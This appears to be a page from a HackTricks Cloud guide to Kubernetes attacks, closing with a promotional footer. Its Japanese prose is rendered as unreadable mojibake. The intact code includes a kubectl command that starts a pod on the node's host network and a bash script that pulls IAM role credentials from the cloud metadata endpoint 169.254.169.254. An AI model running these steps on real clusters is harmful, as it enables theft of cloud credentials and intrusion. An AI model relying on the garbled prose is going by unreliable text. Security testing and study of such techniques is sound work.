å‰ã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã§ã¯ã€ãƒãƒƒãƒ‰ã§IAMãƒ­ãƒ¼ãƒ«ã‚’ç›—ã‚€æ–¹æ³•ã«ã¤ã„ã¦èª¬æ˜ã—ã¾ã—ãŸãŒã€K8sã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼ã®**ãƒãƒ¼ãƒ‰ã¯ã‚¯ãƒ©ã‚¦ãƒ‰å†…ã®ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹**ã«ãªã‚Šã¾ã™ã€‚ã¤ã¾ã‚Šã€ãƒãƒ¼ãƒ‰ã¯ãŠãã‚‰ã**ç›—ã‚€ã“ã¨ãŒã§ãã‚‹æ–°ã—ã„IAMãƒ­ãƒ¼ãƒ«ã‚’æŒã£ã¦ã„ã‚‹å¯èƒ½æ€§ãŒé«˜ã„**ã§ã™ï¼ˆé€šå¸¸ã€K8sã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼ã®ã™ã¹ã¦ã®ãƒãƒ¼ãƒ‰ãŒåŒã˜IAMãƒ­ãƒ¼ãƒ«ã‚’æŒã£ã¦ã„ã‚‹ãŸã‚ã€å„ãƒãƒ¼ãƒ‰ã‚’ãƒã‚§ãƒƒã‚¯ã™ã‚‹ä¾¡å€¤ãŒãªã„å ´åˆã‚‚ã‚ã‚Šã¾ã™ï¼‰ã€‚

ãŸã ã—ã€ãƒãƒ¼ãƒ‰ã‹ã‚‰ãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ãŸã‚ã«ã¯ã€ãƒãƒ¼ãƒ‰ã«ã„ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼ˆSSHã‚»ãƒƒã‚·ãƒ§ãƒ³ï¼Ÿï¼‰ã¾ãŸã¯å°‘ãªãã¨ã‚‚åŒã˜ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã«ã„ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼š
```bash
kubectl run NodeIAMStealer --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostNetwork": true, "containers":[{"name":"1","image":"alpine","stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent"}]}}'
```
### IAMãƒ­ãƒ¼ãƒ«ãƒˆãƒ¼ã‚¯ãƒ³ã®ç›—ã¿å‡ºã—

ä»¥å‰ã€ç§ãŸã¡ã¯**IAMãƒ­ãƒ¼ãƒ«ã‚’ãƒãƒƒãƒ‰ã«ã‚¢ã‚¿ãƒƒãƒã™ã‚‹æ–¹æ³•**ã‚„ã€ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã«ã‚¢ã‚¿ãƒƒãƒã•ã‚Œã¦ã„ã‚‹IAMãƒ­ãƒ¼ãƒ«ã‚’ç›—ã‚€ãŸã‚ã«**ãƒãƒ¼ãƒ‰ã«ã‚¨ã‚¹ã‚±ãƒ¼ãƒ—ã™ã‚‹æ–¹æ³•**ã«ã¤ã„ã¦èª¬æ˜ã—ã¾ã—ãŸã€‚

ä»¥ä¸‹ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’ä½¿ç”¨ã—ã¦ã€ã‚ãªãŸã®æ–°ã—ã„åŠªåŠ›ã®æˆæœã§ã‚ã‚‹**IAMãƒ­ãƒ¼ãƒ«ã®è³‡æ ¼æƒ…å ±ã‚’ç›—ã¿å‡ºã™**ã“ã¨ãŒã§ãã¾ã™ã€‚
```bash
IAM_ROLE_NAME=$(curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null || wget  http://169.254.169.254/latest/meta-data/iam/security-credentials/ -O - 2>/dev/null)
if [ "$IAM_ROLE_NAME" ]; then
echo "IAM Role discovered: $IAM_ROLE_NAME"
if ! echo "$IAM_ROLE_NAME" | grep -q "empty role"; then
echo "Credentials:"
curl "http://169.254.169.254/latest/meta-data/iam/security-credentials/$IAM_ROLE_NAME" 2>/dev/null || wget "http://169.254.169.254/latest/meta-data/iam/security-credentials/$IAM_ROLE_NAME" -O - 2>/dev/null
fi
fi
```
## å‚è€ƒæ–‡çŒ®

* [https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity](https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity)
* [https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c](https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c)
* [https://blogs.halodoc.io/iam-roles-for-service-accounts-2/](https://blogs.halodoc.io/iam-roles-for-service-accounts-2/)

<details>

<summary><strong>ãƒãƒƒã‚¯ãƒˆãƒªãƒƒã‚¯ã‚’ã‚µãƒãƒ¼ãƒˆã—ã¦ç‰¹å…¸ã‚’å¾—ã‚‹ï¼</strong></summary>

* **HackTricks**ã§**ä¼šç¤¾ã®åºƒå‘Šã‚’è¦‹ãŸã„**å ´åˆã‚„ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„å ´åˆã¯ã€[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASSï¼†HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ã€ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’è¦‹ã¤ã‘ã¾ã—ã‚‡ã†
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**Telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter**ã§ç§ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€** [**HackTricks**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚

</details>
